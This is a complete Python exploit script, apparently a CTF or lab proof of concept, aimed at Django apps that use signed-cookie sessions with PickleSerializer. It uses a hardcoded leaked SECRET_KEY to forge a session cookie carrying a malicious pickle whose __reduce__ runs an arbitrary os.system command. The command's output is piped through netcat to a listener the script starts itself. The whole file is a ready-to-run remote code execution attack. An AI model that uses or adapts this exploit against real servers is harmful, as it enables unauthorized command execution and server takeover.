#!/usr/bin/env python3

import os
import sys
import time
import requests
from django.core.signing import loads, dumps, BadSignature
from django.contrib.sessions import serializers
import threading


# Leaked `SECRET_KEY`
SECRET_KEY = 'django-insecure-(yt#!)uq#qdz6y@8)jc^zio(859ze!fp)*dlgvb3x_z7kl)z-x'


class Exploit:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()

    def get_cookie(self):
        response = self.session.get(self.url, params={'name': 'ch4n3.yoon'})
        session = response.cookies.get('sessionid', '')
        if not session:
            print('[ERROR] `sessionid` cookie not found')
            sys.exit()
        return session

    def generate_payload(self, command):
        global SECRET_KEY

        session_cookie = self.get_cookie()
        try:
            session = loads(
                session_cookie,
                key=SECRET_KEY,
                serializer=serializers.PickleSerializer,
                salt='django.contrib.sessions.backends.signed_cookies'
            )
        except BadSignature:
            print('[ERROR] `SECRET_KEY` does not match')
            sys.exit()

        def __reduce__(self):
            return os.system, (f'{command} | nc localhost 1234',)

        _payload = type(
            "POC",
            (object,),
            {"__reduce__": __reduce__}
        )

        session['name'] = _payload()

        return dumps(
            session,
            key=SECRET_KEY,
            serializer=serializers.PickleSerializer,
            salt='django.contrib.sessions.backends.signed_cookies',
            compress=True
        )

    def exploit(self, command='id'):
        self.listen()

        payload = self.generate_payload(command)
        self.session.get(self.url, cookies={'sessionid': payload})

    def listen(self):
        def _listen():
            print('[INFO] Listening on port 1234')
            os.system('nc -l -p 1234')

        listen_thread = threading.Thread(target=_listen)
        listen_thread.start()


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f'Usage: {sys.argv[0]} <url> <command>')
        sys.exit()

    url = sys.argv[1]
    command = sys.argv[2]

    e = Exploit(url)
    e.exploit(command)

